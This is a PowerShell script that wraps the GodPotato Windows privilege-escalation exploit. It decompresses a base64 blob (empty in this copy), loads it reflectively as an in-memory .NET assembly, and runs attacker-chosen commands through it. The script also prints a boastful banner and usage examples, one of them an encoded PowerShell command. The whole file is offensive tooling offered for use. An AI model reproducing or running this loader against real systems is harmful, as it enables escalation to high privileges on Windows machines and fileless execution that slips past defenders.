function Invoke-GodPotato {
    [CmdletBinding()]
    Param (
        [String]
        $Command = "cmd /c whoami"
    )

    # Display ASCII art
    Write-Host " ______  _____  ______   _____   _____  _______ _______ _______  _____ "
    Write-Host "|  ____ |     | |     \ |_____] |     |    |    |_____|    |    |     |"
    Write-Host "|_____| |_____| |_____/ |       |_____|    |    |     |    |    |_____|"
    Write-Host "" # Adds a blank line for readability
    Write-Host -ForegroundColor Red "                 Unseen, unstoppable - Power is mine."
    Write-Host "" # Adds a blank line for readability

    $a = New-Object IO.MemoryStream(,[Convert]::FromBase64String(""))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CompressionMode]::Decompress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo($output)
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    $Commands = @("-cmd", $Command)
    [GodPotato.Program]::main($Commands)

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results

    # Set custom prompt
    function global:prompt { "GodPotato> " }

    # Display command help
    Write-Host -ForegroundColor Magenta 'Command help for you Master:'
    Write-Host -ForegroundColor Cyan 'Invoke-GodPotato "cmd /c whoami /all"'
    Write-Host -ForegroundColor Cyan 'Invoke-GodPotato "cmd /c whoami"'
    Write-Host -ForegroundColor Cyan 'Invoke-GodPotato "powershell -enc dwBoAG8AYQBtAGkA"'
    Write-Host -ForegroundColor Cyan 'Invoke-GodPotato "cmd /c regedit"'
}